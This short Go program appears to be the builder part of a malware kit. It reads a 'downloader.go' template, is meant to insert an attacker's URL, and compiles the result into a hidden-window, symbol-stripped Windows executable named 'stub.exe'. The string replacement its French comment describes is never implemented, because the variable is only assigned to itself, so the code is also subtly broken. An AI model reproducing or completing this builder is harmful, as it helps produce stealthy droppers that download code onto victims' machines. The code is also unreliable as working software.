package main

import (
	"os"
	"os/exec"
)

func main() {
	url := os.Args[1]
	
	content, _ := os.ReadFile("downloader.go")
	newContent := string(content)
	newContent = newContent
	// Remplacer HTTP_SERVER par l'URL
	// (simple remplacement de string)
	
	os.WriteFile("downloader_tmp.go", []byte(newContent), 0644)
	
	cmd := exec.Command("go", "build", "-ldflags=-H windowsgui -s -w", "-o", "stub.exe", "downloader_tmp.go")
	cmd.Run()
}